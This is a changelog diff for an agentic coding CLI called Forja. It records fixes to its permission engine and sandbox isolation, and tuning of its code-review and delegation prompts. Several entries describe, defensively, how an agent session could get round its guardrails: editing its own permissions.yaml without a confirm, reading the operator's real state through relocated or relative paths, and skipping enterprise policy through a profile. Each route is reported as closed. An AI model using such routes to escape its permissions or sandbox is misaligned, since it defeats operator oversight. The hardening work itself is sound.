+pressure: this is NOT a disclosure, but the escalate tier's job is to force a
+confirm even in acceptEdits / autonomous — so under an XDG relocation a write to
+the relocated own `permissions.yaml` would skip that confirm, a silent
+self-policy-edit (broaden allows / disable sandbox; next boot under the tampered
+policy). Supervised mode is unaffected (writes confirm anyway); the teeth are in
+acceptEdits/autonomous. My earlier "lower severity" call leaned on supervised
+mode and under-weighted that — closing it. Generalized the foreign-deny's
+XDG resolver into one `resolveUserTildeDir` (home-relative + XDG location for
+`.config/…`→XDG_CONFIG_HOME and `.local/share/…`→XDG_DATA_HOME; `.ssh`/`.aws`/
+shell rc stay home-only) and applied it to BOTH the escalate dirs and the
+foreign deny — so the engine floor and the sandbox mask now cover the identical
+set. Additive: default namespace + no XDG is byte-identical. Regression test:
+under XDG relocation a write to `<XDG_CONFIG_HOME>/forja/permissions.yaml`
+escalates (read still passes; home-relative still covered). Engine + sandbox
+suites green (262).
+
+## [2026-06-16] playbook: tune code-review from its first real run
+
+The code-review playbook's debut (a 351-file branch) caught a real security
+blocker but also exposed four tuning gaps; applied all four. (1) Budget was stale
+— the run cost $1.81 / 38 tools against a `max_cost_usd: 1.50` / `max_steps: 25`
+cap (over-budget warning fired); raised to $2.50 / 45 to cover a realistic
+branch. (2) Generalize-the-finding: the review found the foreign-deny XDG bug but
+missed the IDENTICAL home-only resolution in the sibling escalate-dirs — added a
+directive to check whether a handling/resolution pattern recurs in sibling code
+and report the CLASS, not the first instance. (3) Large-diff protocol: codified
+what the run did emergently — classify mechanical churn vs substantive logic
+first, review the substantive set, record the rest in `not_reviewed`, don't drown
+in volume. (4) Self-verify high-impact: a `critical`/`high` finding should be
+verified to high confidence by the read-only reviewer's own tools before
+returning, not handed back unverified for the parent to re-check. Bumped
+`prompt_version` 2→3. Body refinements are behavior-covered by the eval +
+loader-parse (no brittle phrase tests, per precedent); loader green (28).
+
+## [2026-06-16] fix(security): foreign read-deny floor must follow XDG relocation
+
+The code-review playbook (now dispatching correctly) immediately earned its keep:
+it flagged a real security blocker in the very `tildeForeignDenyDirs` floor added
+two follow-ups ago (commit 10502139). Independently verified against source: the
+real data/config dirs follow XDG (`storage/paths.ts` `defaultDataDir` →
+`<XDG_DATA_HOME>/<seg>`), and the SANDBOX masks those XDG locations
+(`sandbox-runner.ts` iterates `appDirNames()` over XDG_DATA_HOME/XDG_CONFIG_HOME)
+— but the ENGINE foreign-deny resolved `resolve(home, …)` only. Since
+`read_file`/`grep` run OUTSIDE the sandbox, that floor is their sole defense, so
+under an XDG relocation (a supported config) a `--profile` session could
+`read_file`/`grep` the operator's real audit hash-chain, sessions, and trust
+corpus at `<XDG>/forja` — the exact disclosure the foreign deny exists to block.
+Fixed by resolving each foreign Forja user dir to BOTH its home-relative path AND
+its XDG location (`.local/share/<seg>`→XDG_DATA_HOME, `.config/<seg>`→
+XDG_CONFIG_HOME), reading `process.env` and using the same absolute-and-differs
+guard as the sandbox — so the engine floor and the sandbox mask now cover the
+same set. Deny applies to read AND write, so this closes both directions.
+Regression test: under FORJA_PROFILE=dev + relocated XDG, a profiled session is
+denied reading `<XDG_DATA_HOME>/forja/sessions.db` and `<XDG_CONFIG_HOME>/forja/…`
+while the active `forja-dev` at the XDG location stays accessible; home-relative
+still denied (defense in depth). Engine + sandbox suites green (261). Also fixed
+two stale-comment nits the review caught (`init.ts` playbook/skill counts +
+path: agents/*.md/10 → playbooks/*.md/4, skills 20 → 8; `memory/paths.ts` a
+`$XDG_CONFIG_HOME/agent/memory/` rename leftover → `forja`). Two flagged
+questions are non-issues: the eval executor's `process.env.FORJA_PROFILE`
+save/restore is safe under the sequential case runner (documented constraint),
+and `applyProfileFlag`'s global `--profile` strip is by design (no subcommand
+takes a positional equal to the literal string `--profile`).
+
+NOTE — related lower-severity gap left open: `tildeEscalateDirs` (escalate-on-
+write for the ACTIVE namespace + the canonical credential dirs) has the same
+home-only resolution, so a write to the XDG-relocated active config wouldn't
+escalate. Not a disclosure (the foreign DENY, now XDG-aware, covers the
+canonical dir's writes), and pre-existing; a separate follow-up if we want the
+escalate floor XDG-aware too.
+
+## [2026-06-16] prompt: dispatch is the default when the request IS a playbook job
+
+Operator-reproduced on the DEFAULT model (opus-4-8, clean catalog): "faça code
+review da branch atual" was performed INLINE (git diff + read files, then a hard
+abort at 23s) instead of dispatching the `code-review` playbook. Not a weak-model
+issue and not the earlier stale-catalog phantom — a real routing gap. Root cause:
+the delegation preamble framed delegation as "the exception" with "default to
+answering directly", which pulls a capable model toward doing the review itself
+even though the request matches the playbook's `when_to_use` exactly and the
+routing eval already expects dispatch. Fixed by making dispatch the DEFAULT for a
+request that names a playbook's domain: added an explicit, up-front directive
+mapping "review this diff/PR/branch" → `code-review`, "audit / is this secure" →
+`security-audit`, "why is this slow" → `perf-investigate`, and calling out the
+inline anti-pattern ("the request named the job; route it, do not re-implement
+it"). Qualified the closing so "default to answering directly" now scopes to a
+general question, while a playbook-domain request defaults to dispatch. Kept the
+test-pinned phrases. Locked with a regression routing eval
+(`_routing/06-dispatch-review-current-branch.yaml`, the exact failing prompt) +
+a unit test asserting the directive + the review→code-review mapping.
+playbook-prompt + bootstrap suites green (82). NOTE: the behavioral fix (does
+opus now dispatch?) is NOT verified here — the routing eval is LLM-driven and was
+not run (no provider); needs a live REPL re-test or an eval run with a key.
+
+## [2026-06-16] skills: retire `review-diff`, absorb its sharp checks into the gate
+
+Removed the `review-diff` seed skill (9 → 8 canonical skills). It was the
+in-context self-review-before-commit pass — but with the `code-review` playbook
+now a proper merge gate, the two overlapped enough that keeping both invited
+the model to pick the wrong primitive. Before deleting, absorbed the three
+checks that genuinely SHARPEN a read-only gate and weren't already explicit in
+the playbook: leaked secrets/keys/tokens committed in the diff (→ `Find`, a
+clear critical blocker the generic "security risks" didn't name); the
+sink-correct defense for untrusted-input/auth/query/shell/path lines —
+parameterized query, output escaping, path normalization (→ `Consider`); and
+"read the enclosing function of each hunk, not just the changed lines" (→
+`Consider`, anti-shallow review). Deliberately did NOT absorb the parts that
+would re-introduce the noise the gatekeeper rewrite removed: the coupling/
+cohesion triggers (maintainability, not a merge blocker), the broad
+"new logic must ship a test" mandate (the gate flags only a specific
+dangerous-path test gap), the self-fix/`edit` behavior (the gate is read-only),
+and "state intent in one sentence" (the gate takes intent from the PR; `questions`
+covers ambiguity). Removal footprint: deleted the `.md`, dropped the
+`init-skills/index.ts` import + `CANONICAL_SKILLS` entry, updated `docs/SKILLS.md`
+(seed-set sentence + the two `9` counts → `8`), and the two count assertions in
+`init-skills.test.ts`. No eval or sibling-skill referenced it. skills + init +
+playbook suites green (58).
+
+## [2026-06-16] prompt: frame subagent delegation as context compression
+
+The `# Playbook subagents` delegation preamble (`playbook-prompt.ts`) already
+listed "context isolation" as one of four reasons to delegate, but framed the
+whole decision around schema-fit (named playbooks) and actively DISCOURAGED
+delegating exploration ("premature delegation locks in a schema"). That left the
+highest-value case under-served: delegating a large, well-scoped investigation
+to `general-purpose` purely to keep its raw reads/greps OUT of the parent context
+— the lever that most reduces context growth (and, per the cost profile, the
+write-cost axis). Augmented the preamble (NOT a second competing section — the
+existing one is the right home) with the central economics up front: a subagent
+returns only a summary, so delegate when the cost of the exploration exceeds the
+cost of that summary; ask for findings + evidence (file:line), not the trail.
+Added the self-contained-investigation case (repo exploration, root-cause, broad
+search) as an explicit "delegate when", and reconciled the exploration
+contradiction: a clear question over voluminous reading IS compression (good);
+an ill-formed problem you are still shaping interactively is not (delegate once
+the question is sharp). Added a "tightly coupled / continuous coordination"
+exclusion. Kept the test-pinned phrases (`task_sync`/`task_async`, "Delegate to
+a playbook when", "Do NOT delegate when", "Default to answering directly"); no
+layer added, so the system-prompt order is unchanged. New test asserts the
+compression framing + the new candidate/exclusion. playbook-prompt + bootstrap
+suites green (81). (Spec `PLAYBOOKS.md §1.4` could be synced to match; left for a
+spec PR — not touched here.)
+
+## [2026-06-16] playbook: rewrite the code-review gate (merge-gatekeeper prose)
+
+Rewrote the `code-review` seed playbook body around a sharper merge-gatekeeper
+prompt — adopting its objective, enumerated structure wholesale (Find / Ignore /
+Consider / Report: concrete lists of what counts as a real issue, what to ignore
+outright, and the analytical lens to apply) over the old DO/DO NOT paraphrase.
+The ONE thing not adopted is the gatekeeper prompt's free-form markdown output:
+that would break the eval's `output_schema_valid` assertion and the
+machine-readable `task` envelope, so output stays the validated YAML
+`output_schema`. Kept the root-premise fields `not_reviewed` + `assumptions`
+("declare what was NOT measured") and the `questions` channel, plus the Forja-
+specific operational bits a spawned subagent needs (read-only `git` fetch, grep
+impact-radius heuristics) that the source prompt lacked. Added a second axis
+`confidence` (high/medium/low) ORTHOGONAL to severity, and `introduced_by` (the
+causal link to THIS diff, distinct from `why`/impact) to every blocker in the
+schema, with criteria tables for both ("how bad if real" vs "how sure it's
+real"). Hardened scope: no pre-existing issue unless the diff worsens it, no
+weak-evidence findings, a few strong over many weak, untraceable-to-diff ⇒ drop.
+Bumped `prompt_version` 1→2 (prompt + schema changed; context recipe unchanged).
+Extended the eval (`evals/playbooks/code-review/01-blocker-and-nit.yaml`) to
+assert the output carries `confidence` + `introduced_by`. Loader test green (28)
+— the playbook still parses; the LLM-driven eval itself was not run here (no
+provider).
+
+## [2026-06-15] build: version (+ profile) in the binary name
+
+The build artifact was a bare `dist/forja-<id>` — no version, and a dev build
+(`FORJA_PROFILE=dev bun run build`) silently clobbered the release artifact at
+the same path. `assetName(t)` (scripts/targets.ts, the single source every build
++ release script keys off) now produces `forja-<version>[-<profile>]-<id><ext>`:
+version from the canonical `VERSION` const (self-describing release artifacts,
+multiple versions coexist), and the profile segment ONLY when FORJA_PROFILE is
+set at build time. Crucially the profile is a build-CONTEXT label, NOT a
+behavioral lock — the binary is profile-agnostic and resolves the profile at its
+OWN runtime (verified: built under FORJA_PROFILE=dev, the binary still runs
+canonical when invoked without `--profile`); the label just keeps a dev build
+from overwriting a release one in dist/. `assetName` gained an `env` test seam.
+Every consumer (smoke, checksums, sbom, repro-check, size gate, sourcemap
+rename) follows automatically; updated `package.json` bin + README install to
+the versioned name and the script tests (targets/checksums/build-targets) off
+hardcoded names onto `assetName`. Measured: `bun run build` →
+`dist/forja-0.0.0-linux-x64`, `FORJA_PROFILE=dev bun run build` →
+`dist/forja-0.0.0-dev-linux-x64`, both coexisting; typecheck + lint + scripts
+tests (69) green.
+
+## [2026-06-15] dev-mode: isolated `--profile` namespace (dev vs real state)
+
+The maintainer develops Forja AND uses it on real projects from the same machine,
+so a dev build was migrating/polluting the operator's real sessions DB, config,
+memory, and trust list. dev-mode gives each `--profile <name>` (or `FORJA_PROFILE`
+env) a FULLY isolated on-disk namespace: user-level `~/.config/forja-<name>`,
+`~/.local/share/forja-<name>`, `~/.cache/forja-<name>`, and per-project
+`<cwd>/.forja-<name>/`. No profile ⇒ the canonical `forja`/`.forja`,
+byte-identical to before.
+
+Keystone is `src/config/app-namespace.ts`: `appDirName()` / `projectDirName()`
+(profile-aware path segments), `activeProfile()` (diagnostics), `appDirNames()`
+(canonical + active-profile, for the security lists), and `isValidProfile()` —
+the profile name is allowlisted char-by-char to `[a-z0-9][a-z0-9-]*` (no regex;
+rejects `/`, `..`, leading hyphen, empty) since it becomes a path segment. A
+malformed profile THROWS rather than silently falling back to the real namespace
+(that would defeat the isolation the operator asked for).
+
+Routed ~20 resolvers through the helpers (storage/paths, agent-paths,
+memory/paths, trust/paths, subagents/paths, skills/paths, sandbox-skip,
+worktree, history, bootstrap bg/banner, purge, init, runtime bg, slash
+memory/history, permission-policy-rollback, eval executor, gitignore, plus the
+user-facing "create `.forja/permissions.yaml`" hints in repl/render/
+explain-permissions). The security lists became profile-aware functions:
+`hidePathsDirs()` (sandbox masking) and `tildeEscalateDirs()` (engine
+escalate-on-write) now cover BOTH the canonical `forja` AND the active
+`forja-<profile>` dirs, so a dev sandbox can't read the operator's real audit
+DB/secrets and vice-versa — and the conversion deduped a latent double
+`.config/forja` entry. `FORJA_PROFILE` is not credential-shaped, so `scrubEnv`
+already preserves it across the subagent + broker-worker spawn boundaries
+(verified the broker worker resolves no profile path; the parent builds all
+sandbox args).
+
+Entry point: a global `--profile` pre-pass (`src/cli/profile-flag.ts`,
+`applyProfileFlag`) runs in `index.ts` BEFORE parseArgs and any resolver — it
+sets `process.env.FORJA_PROFILE`, strips the flag (every subcommand parser would
+reject it), and validates flag-or-env value to a clean usage error instead of a
+deep throw. Ergonomics: `bun run dev` now runs under `FORJA_PROFILE=dev`;
+`forja doctor` reports the profile (JSON `info.profile` + a footer line) and its
+`data_dir` check stopped hardcoding `forja`; the boot banner gains a yellow
+`profile: <name> (isolated namespace)` line and the always-visible footer a
+yellow `profile:<name>` chip (threaded through `SessionBannerEvent` →
+`StatusState`/`session-banner` item, no env reads in the renderers); root
+`.gitignore` ignores `.forja-*/`; `--profile` documented in `usage()` (which also
+shed two stale `agent` references from the rename). New tests: app-namespace
+helpers, `applyProfileFlag` parse/validation/strip, profile cases on agent-paths
++ sandbox-hide-paths, doctor profile output + data_dir, footer/banner chips.
+typecheck + lint clean; permissions (2309) + cli/storage/trust/memory/subagents
+(4295) + focused (445) all green; end-to-end smoke confirmed isolation under a
+temp HOME.
+
+Code review (9 finder angles + inline verify) surfaced one real isolation gap:
+the sandbox XDG_DATA_HOME overlay (linux bwrap + macOS SBPL) masked only the
+ACTIVE profile's data dir, so under `--profile dev` + a relocated XDG_DATA_HOME
++ `home-rw`, a dev sandbox could still read the operator's REAL `forja`
+sessions/audit DB at `<xdg>/forja`. Fixed both runners to iterate `appDirNames()`
+(mask canonical + profile), mirroring the XDG_CONFIG_HOME branch; reads
+`process.env` (the host data-dir source defaultDataDir used), with a regression
+test asserting both dirs are masked under a profile. Also folded in: forward
+`FORJA_PROFILE` through the broker worker's sandbox `passthroughEnv`
+(defense-in-depth — the worker resolves no namespaced path today but a future
+lookup must stay in-namespace); made `purge`'s PRESERVED_PATHS dry-run text +
+the welcome sandbox-skip fallback profile-aware; dropped a dead `=== ''` footer
+guard and a no-op argv reconstruction in `applyProfileFlag`; fixed stale
+`agent`/`6 .config/*` comments and one more `agent "your prompt"` rename
+leftover in the welcome next-steps. typecheck + lint clean; permissions (2578,
+one cross-process audit test flaked under load, green in isolation) green.
+
+Post-commit follow-up (review catch): `enterpriseAgentPath` was wrongly routed
+through `appDirName(env)`, so `--profile dev` would relocate the enterprise
+lookup to `/etc/forja-<profile>` / `%PROGRAMDATA%\forja-<profile>` — which no
+admin installed — and silently SKIP the enterprise policy + locked hooks (an
+enterprise-guardrail bypass via a profile). Reverted that resolver to canonical
+`/etc/forja` / `%PROGRAMDATA%\forja`; both enterprise consumers
+(`enterprisePolicyPath`, `enterpriseHooksPath`) delegate to it, so the fix
+covers policy and hooks. A profile now isolates USER + PROJECT state ONLY; the
+machine guardrail stays put. Regression test pins enterprise canonical under a
+profile; app-namespace header documents the carve-out.
+
+Second follow-up (same class, project level): the protected-paths
+`cwdEscalateDirs()` was built from `projectDirName()`, so under a profile it
+listed only `.forja-<profile>` and DROPPED the canonical `.forja` — writes to
+the operator's real `/repo/.forja/permissions.yaml` (policy, sessions) stopped
+escalating during a profiled run, losing the guard against silent edits a
+profile is meant to preserve. Added a `projectDirNames()` helper (project analog
+of `appDirNames()`) and route the escalate list through it so it covers BOTH
+`.forja` AND `.forja-<profile>`. No profile ⇒ `['.git', '.forja', '.claude']`,
+byte-identical. Regression test asserts writes to both project dirs escalate
+(reads pass) under a profile.
+
+Third follow-up (same direction, purge UX footgun): `forja purge`'s dry-run
+scopes to `.forja-<profile>/` under a profile, but the advertised
+`report.command` was a bare `forja purge --force` — copy-pasting it drops the
+profile and operates on the REAL canonical `.forja/`, a different namespace than
+the one previewed, risking a purge of the operator's real project state. The
+suggested command (human + JSON) now re-prefixes `--profile <name>` whenever a
+profile is active, so it hits the same namespace the report described.
+Regression test asserts scope AND command both stay profiled.
+
+Fourth follow-up (closing the class via a focused self-audit): enumerated every
+consumer of the profile helpers and every advertised `forja …` command string.
+The guardrail/protection + path resolvers were all confirmed correct; the
+remaining instances of the "advertised command drops the profile" footgun were
+`doctor`'s 5 remediations (`permission verify` / `rotate-chain` / `inspect` /
+`seal-verify` / `seal-now` — the mutating ones would have rotated/sealed the
+REAL chain from a profiled diagnosis) and `permission-inspect`'s "clear after
+inspection" hint. Extracted a shared `forjaCommand(rest)` helper
+(`src/cli/forja-command.ts`) that re-prefixes the active `--profile`, refactored
+purge onto it, and applied it to all six remaining strings. Unit-tested the
+helper (no profile ⇒ byte-identical bare command; profile ⇒ prefixed). This
+closes the "a profile silently drops/redirects a real-namespace guard" category
+end-to-end (enterprise layer, project escalate list, purge + doctor + inspect
+commands).
+
+Fifth follow-up (audit gap — `init`): the "closed end-to-end" claim above was
+overstated. `init`'s scaffold follow-up — `review .forja-<profile>/ and run
+'forja' to start` — advertised a BARE `forja` launch command; copy-pasting it
+opens the canonical namespace, creating/migrating the real `~/.config/forja` +
+`~/.local/share/forja` state a profile is meant to keep isolated. The self-audit
+missed it because its grep matched `forja permission|purge|...` verbs, not the
+no-verb launch command. Routed it through `forjaCommand('')` and extended the
+helper to render the bare launch command without a trailing space (`forja` /
+`forja --profile <name>`); unit-tested the empty-rest case.
+
+Sixth follow-up (the actual exhaustive sweep): grepped EVERY operator-facing
+`forja …` command string (verb + bare-launch shapes), not just the verb pattern
+the fifth-follow-up audit used. That found the rest of the class:
+`gc`'s suggested `forja gc --force [--table=…]` command (HIGH — mutating, sweeps
+the profile-aware global DB; missed before because the audit filter skipped
+`return` statements), `welcome`'s next-steps menu (operator-flagged: `init` /
+`"prompt"` / `--explain-permissions` / `permission grants` / `--help` / `doctor`),
+`purge`'s `run 'forja init'` not-initialized hint (would scaffold the REAL
+`.forja/`), and the lower-severity read-only/throwaway hints (`Run 'forja doctor'`
+in harness-adapter + sandbox-setup; `forja worktree gc` in runtime + worktree).
+All routed through `forjaCommand`. No profile ⇒ byte-identical, so column
+alignment + every existing test holds. This is the class closed for real, across
+both command shapes and all surfaces (cli + tui + subagents).
+
+Seventh follow-up (a DIFFERENT class — project read isolation, operator-flagged):
+write isolation held, but a profiled session could still READ the operator's real
+canonical `.forja/` (project memory/config/traces) co-located in the repo. Two
+floors leaked: the engine classifier escalates `.forja/` only on WRITE (`op ===
+'read'` returns null), and the sandbox masked only home-level credential dirs,
+never a cwd-level project dir — so `read_file`/`grep` and sandboxed bash could
+disclose real project state despite the profile using `.forja-dev/`. (This also
+made the README's advertised "can't read your real memory" false.) Added
+`foreignProjectDirNames()` (the canonical `.forja` under a profile; empty on the
+default namespace — the active `.forja-<profile>/` is never foreign and stays
+readable). The engine now DENIES read+write of the foreign dir (deny tier, ahead
+of the read-passthrough; supersedes the canonical dir's escalate under a
+profile), and both sandbox runners (linux tmpfs overlay + macOS SBPL deny) mask
+it under cwd. No profile ⇒ no foreign dir, byte-identical. Tests both directions:
+foreign `.forja` denied/masked, active `.forja-<profile>` still readable
+(engine + linux + macOS). README claim now holds.
+
+Eighth follow-up (same class, subdir gap — operator-flagged): the sandbox
+foreign-`.forja` overlay was anchored at the per-command `cwd`. A bash command's
+`args.cwd` can be any subdir of the session tree, so it overlaid `<subdir>/.forja`
+(usually nonexistent) while the real project state at `<repoRoot>/.forja` stayed
+reachable as `../.forja/...`. Threaded the bootstrap-resolved session root
+(`projectConfigCwd = resolveRepoRoot(cwd)`, already computed once at startup — no
+per-call git spawn) through `constructBroker` → the sandbox runner → both
+`buildBwrapArgv` (tmpfs) and macOS `buildSbplProfile` (SBPL deny) as `projectRoot`,
+and anchored the foreign overlay there (defaults to `cwd` when omitted, for
+back-compat/tests). Regression tests: subdir cwd + project root → overlay/deny
+lands at `<root>/.forja`, not `<subdir>/.forja` (linux + macOS).
+
+Ninth follow-up (measured-not-assumed: the ENGINE had the gap too). The eighth
+note claimed the engine floor was already correct because it uses the session
+cwd, not per-command `args.cwd`. Measuring it (`bootstrap.ts:776` passes the raw
+launch `cwd` to `bootstrapPermissionEngine`, NOT the resolved repo root) showed
+that was wrong for the launch-from-a-subdir case: the engine's foreign-`.forja`
+deny resolved at `<launchCwd>/.forja`, missing the real `<repoRoot>/.forja` (a
+profiled session launched from `repo/src/` could `read_file ../.forja/...`).
+Fixed by anchoring the engine's foreign-deny at `resolveRepoRoot(cwd)` in
+`getResolvedTargets` — gated on a profile being active (no git spawn on the
+default namespace), cached per (home,cwd), graceful-degrade to `cwd` if git is
+unavailable, and byte-identical when cwd already IS the repo root (the common
+launch). An adversarial shakeout in a REAL git repo (subdir launch, `--profile
+dev`) confirmed both floors end-to-end: engine DENIES read+write of the real
+`.forja/`, leaves the active `.forja-dev/` readable; sandbox masks `<root>/.forja`
+not `<subdir>/.forja`. typecheck + lint + permissions (2317) green.
+
+Tenth follow-up (same root, the OTHER half — operator-flagged asymmetry): the
+ninth fix repo-rooted the foreign DENY but left the active-project ESCALATE
+(`.git` / `.claude` / `.forja-<profile>` via cwdEscalateDirs) anchored at the
+launch cwd. So a profile launched from a subdir would NOT escalate writes to the
+active `<repoRoot>/.forja-<profile>/permissions.yaml` (reachable as
+`../.forja-<profile>/...`) — they'd pass silently under acceptEdits / broad
+write policies, missing the intended confirm for Forja project state. Closed by
+anchoring `cwdEscalateDirs` at the same `projectRoot` (resolveRepoRoot) as the
+foreign deny when a profile is active — both halves now repo-rooted, reusing the
+one cached resolveRepoRoot call (no extra git spawn; default namespace
+unchanged). Shakeout in a real git repo (subdir launch): write to
+`../.forja-dev/permissions.yaml` → escalate, `../.git/config` → escalate,
+`../.forja/x` → deny (foreign), `../.forja-dev/x` read → pass. typecheck + lint +
+protected_paths (120) green.
+
+Eleventh item (investigated, NOT a bug — first review item that didn't hold). A
+review flagged that the subagent spawn `scrubEnv(process.env, { keep:
+PROVIDER_API_KEY_VARS })` drops FORJA_PROFILE, so children would run in the
+canonical namespace and miss the parent's session row. Measured: `scrubEnv` does
+NOT drop FORJA_PROFILE — `_PROFILE` matches no SCRUB_PATTERN, so it passes
+through (no `keep` needed), and the child resolves `defaultDbPath()` (env-driven,
+`subagent-child.ts` takes no dbPath in production — comment: "defaultDbPath() so
+child + parent target the same file") → `forja-<profile>/sessions.db`, same file
+the parent wrote. The broker worker needed an explicit passthrough only because
+bwrap `--clearenv` strips env at the kernel boundary; the subagent is a plain
+`Bun.spawn({ env: scrubEnv(...) })` that preserves it. No code change — but added
+a regression test pinning "scrubEnv preserves FORJA_PROFILE" (the invariant the
+whole profile-propagation chain rests on), so a future `/_PROFILE$/`-style scrub
+pattern can't silently break subagents under a profile.
+
+Twelfth follow-up (the subdir read-floor, ALL sandbox callers — operator-flagged):
+the project-root anchoring only reached the broker bash path (it threads
+`projectRoot` from bootstrap). The OTHER `maybeWrapSandboxArgv` callers —
+`tools/builtin/grep.ts`, `tools/builtin/git.ts`, `bg/manager.ts` — pass only
+`cwd: ctx.cwd` (a per-tool-call cwd, possibly a subdir), so under a profile a
+sandboxed grep/git/bg subprocess fell back to masking `<subdir>/.forja` and left
+the real `<repoRoot>/.forja` readable via `../.forja/...`. Threading
+`projectRoot` through ToolContext + the bg manager would have plumbed a new field
+across the whole tool infra; instead centralized the default IN
+`maybeWrapSandboxArgv`: when no `projectRoot` is passed and a profile is active,
+it resolves the repo root (`resolveRepoRoot`, profile-gated so no git spawn on
+the default namespace, cached per cwd, graceful-degrade to cwd). Every caller —
+current and future — now anchors at the repo root; the broker keeps passing its
+bootstrap-resolved root explicitly (no spawn). Verified by a real-git+bwrap
+shakeout: `maybeWrapSandboxArgv` with no projectRoot + a subdir cwd masks
+`<repoRoot>/.forja`, not `<subdir>/.forja`, and leaves the active `.forja-dev`
+readable. Deterministic regression test for the explicit-projectRoot
+pass-through (bwrap-conditional, like the sibling live-host tests).
+
+Thirteenth follow-up (the EXPORTED targets view — my own scoping miss). When the
+foreign deny was added (9th), it went only into the internal `getResolvedTargets`
+(used by `classifyProtectedPath`), NOT the exported `protectedTargets` —
+reasoned as "policy-validator-only, out of scope." But `protectedTargets` also
+feeds the bash GLOB GUARD (`couldGlobReachProtected`) at runtime, and it still
+(a) lacked the foreign deny root and (b) resolved cwdEscalateDirs against the
+raw/subdir cwd. So a glob like `../.forja/*` from a subdir could slip the
+protected-glob refuse and read/write the real project state in sandbox-host /
+in-process runs. Fixed by making `protectedTargets` REUSE `getResolvedTargets`
+(repo-root-anchored cwd-escalate + the foreign deny root, cached), adding
+`cwdForeignDenyDirs` to the `ProtectedTargets` shape, and including it in the
+glob guard's reachability scan. The policy validator uses explicit fields, so
+it's unaffected (additive). No behavior change on the default namespace. Tests:
+protectedTargets surfaces the foreign root under a profile, empty without.
+
+Fourteenth follow-up (eval hermeticity — my own routing miss, operator-flagged).
+The 1st-commit routing pushed the eval executor's policy path through
+`projectDirName()`. Eval cases author fixtures/setup.files against the canonical
+`.forja/permissions.yaml`; under a dev-profile shell the executor looked for
+`.forja-<profile>/`, didn't see the case's policy, wrote the DEFAULT (bypass)
+there, and bootstrap (also profiled) read that — so custom eval policies were
+silently ignored and experiments ran against the wrong policy. Evals must be
+HERMETIC w.r.t. FORJA_PROFILE: reverted the policy path to the literal canonical
+`.forja/`, and `executeCase` now clears FORJA_PROFILE for the run (save/delete/
+restore, beside the existing FORJA_OPENAI_REASONING_REPLAY pin) so setupCwd's
+write AND bootstrap's read both resolve `.forja/` (the eval DB is a temp file,
+unaffected). Behavioral regression test: under FORJA_PROFILE=dev a case shipping
+a strict `.forja/` policy denies write_file (file_exists fails) — which only
+holds if the canonical policy was read; a `.forja-dev/` mis-read would get the
+default bypass and pass. Also pins env restore.
+
+Fifteenth follow-up (closing-sweep verdict — full re-audit of every helper
+consumer, operator-requested). Enumerated EVERY consumer of the app-namespace
+helpers across src/ plus every remaining raw `.forja`/`forja` path literal, and
+classified each against intent. Verdict: the functional + security surface is
+CLEAN — all on-disk state correctly profiled, the two carve-outs correct on
+purpose (`enterpriseAgentPath` canonical so `--profile` can't skip the admin
+guardrail; the eval executor hermetic per the fourteenth follow-up), and the
+security lists cover both namespaces. The only mis-routes were three clusters of
+DISPLAY-only advisory strings that hardcoded the canonical name while their
+FUNCTIONAL counterpart was already profiled — so a `--profile` session was told
+to look in a directory the run never reads: (1) the "Define agents under
+`~/.config/forja/playbooks/` or `<cwd>/.forja/playbooks/`" hint in all three
+subagent tools (task/task_async/task_list) — the real dirs (subagents/paths.ts)
+are profile-aware; (2) `/hooks`'s "no hooks.toml at …" note (kept `/etc/forja`
+canonical — the enterprise layer is NOT profiled — but routed the user + project
+segments); (3) `/memory governance`'s source-label strings
+(`yes (~/.config/forja/config.toml)` etc.) while the actual write site already
+used `projectDirName()`. Fixed by interpolating the helpers; the five playbook
+sites now share one `playbookDirsHint(env=process.env)` in task-shared.ts (the
+module all three tools already import), which throws on a malformed profile like
+the path helpers rather than silently using canonical. Code COMMENTS describing
+the canonical layout were left as-is (documentation of the default form, not a
+runtime path). New unit test for `playbookDirsHint` (no-profile byte-identical /
+profile-carried / malformed-throws); the existing default-namespace label tests
+in memory.test.ts stay green unchanged (byte-identical when no profile is set).
+
+Sixteenth follow-up (closing the one real isolation asymmetry the sweep's
+verdict named — operator-asked "totalmente isolados?"). The closing sweep
+reported the functional surface clean EXCEPT one asymmetry: the project-level
+real `.forja/` was read+write DENIED from a profiled session, but the USER-level
+real state (`~/.config/forja` + `~/.local/share/forja` — audit DB, trust list,
+sessions, install_id; strictly MORE sensitive, spanning all projects) had only
+escalate-on-write + the sandbox mask. The sandbox masks both namespaces' user
+dirs for EXEC tools (`hidePathsDirs`), but `read_file`/`grep` read OUTSIDE the
+sandbox and hit only the engine floor — and for `op === 'read'` the engine
+denied just SYSTEM_DENY_ROOTS + the project foreign dir, so a profiled session
+could disclose the operator's real audit/sessions/config via a plain read
+(confirm, not deny). Closed it symmetric to the project level: new
+`foreignAppDirNames()` (`[]` default / `['forja']` under profile — the user-level
+dual of `foreignProjectDirNames`), a `tildeForeignDenyDirs` set covering
+`.config/<seg>` + `.local/share/<seg>` (mirroring exactly what the escalate list
+and the sandbox mask cover), and a deny loop in `classifyProtectedPath` that
+runs BEFORE the read passthrough (read AND write) — superseding the escalate the
+canonical dir would otherwise get, while the active `forja-<profile>` dir (never
+foreign) keeps escalate-on-write + readability. Surfaced on `protectedTargets`
+so the bash glob guard refuses a glob like `~/.config/f*` into the real
+namespace too. Additive: empty on the default namespace ⇒ byte-identical, no git
+spawn, no sandbox change (the mask already covered exec). Tests: foreignAppDirNames
+(default/profile/malformed), engine deny of the real user dir for read+write
+under profile, the active forja-dev dir staying accessible, no-profile
+byte-identical, and the glob-guard surfacing. Full permissions suite green
+(2344). Spec note (AGENTIC_CLI §9 / SECURITY_GUIDELINE) deferred — dev-mode is
+still code-behind-spec end-to-end.
+
+Seventeenth follow-up (smoke coverage tracked the rename — operator-flagged).
+Routing `worktree.ts` through `appDirName()` means `defaultWorktreeRoot()` now
+resolves `$XDG_CACHE_HOME/forja/worktrees` (or the active profile), but
+`evals/smoke-worktree-gc.sh` still seeded its fixture under the pre-rename
+`$XDG_CACHE_HOME/agent/worktrees`. The smoke still PASSED — the GC plan includes
+DB rows filtered by the parent repo cwd, so the seeded row was handled via the
+DB path — but the fixture sat OUTSIDE the root the CLI scans, so the cache-scan
+reconciliation (`listCacheDirs`) and the under-root removal fallback
+(`isUnderRoot`, worktree-gc.ts) were no longer exercised: a silent false-green.
+Fixed by DERIVING the root from the source of truth at smoke startup
+(`bun -e … defaultWorktreeRoot()`) instead of hardcoding a namespace — so the
+fixture always lands under whatever root `--worktrees gc` resolves, and the
+coverage can't silently drift on a future rename or profile. Dropped the dead
+`mkdir $XDG_DATA_HOME/agent` (openDb auto-creates its dir). Verified: smoke green
